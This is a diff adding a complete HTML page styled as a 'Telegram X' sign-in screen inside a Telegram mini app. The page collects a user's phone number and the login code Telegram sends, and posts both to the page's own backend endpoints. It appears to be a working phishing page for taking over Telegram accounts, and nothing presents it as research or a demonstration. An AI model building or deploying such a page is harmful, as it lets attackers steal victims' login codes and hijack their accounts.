@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram X</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0f0f1a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 380px;
+            width: 100%;
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 30px 24px;
+        }
+        h2 {
+            text-align: center;
+            color: #0088cc;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 10px;
+            background: #2a2a3e;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border: 2px solid #0088cc;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 16px;
+            border: none;
+            border-radius: 10px;
+            background: #0088cc;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0099dd;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+        }
+        .success {
+            background: rgba(76, 175, 80, 0.2);
+            color: #4caf50;
+            border: 1px solid #4caf50;
+            display: block;
+        }
+        .error {
+            background: rgba(229, 62, 62, 0.2);
+            color: #e53e3e;
+            border: 1px solid #e53e3e;
+            display: block;
+        }
+        .info {
+            background: rgba(0, 136, 204, 0.2);
+            color: #0088cc;
+            border: 1px solid #0088cc;
+            display: block;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Telegram X</h2>
+        <input type="tel" id="phone" placeholder="+7 999 123-45-67">
+        <div id="codeSection" class="hidden">
+            <input type="text" id="code" placeholder="Code from Telegram">
+        </div>
+        <button id="submitBtn">Sign In</button>
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        if (tg) tg.expand();
+
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+        const codeSection = document.getElementById('codeSection');
+        const submitBtn = document.getElementById('submitBtn');
+        const messageEl = document.getElementById('message');
+
+        let step = 'phone';
+        let currentPhone = '';
+
+        function showMessage(text, type) {
+            messageEl.textContent = text;
+            messageEl.className = 'message ' + type;
+        }
+
+        submitBtn.addEventListener('click', async function() {
+            if (step === 'phone') {
+                const rawPhone = phoneInput.value.replace(/\D/g, '');
+                if (rawPhone.length < 10) {
+                    showMessage('❌ Invalid phone number', 'error');
+                    return;
+                }
+                currentPhone = '+7' + rawPhone.substring(1);
+                showMessage('⏳ Sending code...', 'info');
+                submitBtn.disabled = true;
+
+                try {
+                    const resp = await fetch('/api/auth/send', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({phone: currentPhone})
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        step = 'code';
+                        codeSection.classList.remove('hidden');
+                        showMessage('✅ Code sent! Check Telegram', 'success');
+                    } else {
+                        showMessage('❌ ' + data.message, 'error');
+                    }
+                } catch (err) {
+                    showMessage('❌ Connection error', 'error');
+                }
+                submitBtn.disabled = false;
+                return;
+            }
+
+            if (step === 'code') {
+                const code = codeInput.value.trim();
+                if (!code) {
+                    showMessage('❌ Enter code', 'error');
+                    return;
+                }
+                showMessage('⏳ Verifying...', 'info');
+                submitBtn.disabled = true;
+
+                try {
+                    const resp = await fetch('/api/auth/verify', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            phone: currentPhone,
+                            code: code
+                        })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        showMessage('✅ Access granted!', 'success');
+                        submitBtn.textContent = '✅ Logged In';
+                        submitBtn.disabled = true;
+                        if (tg) tg.showAlert('Access granted!');
+                    } else {
+                        showMessage('❌ ' + data.message, 'error');
+                    }
+                } catch (err) {
+                    showMessage('❌ Connection error', 'error');
+                }
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
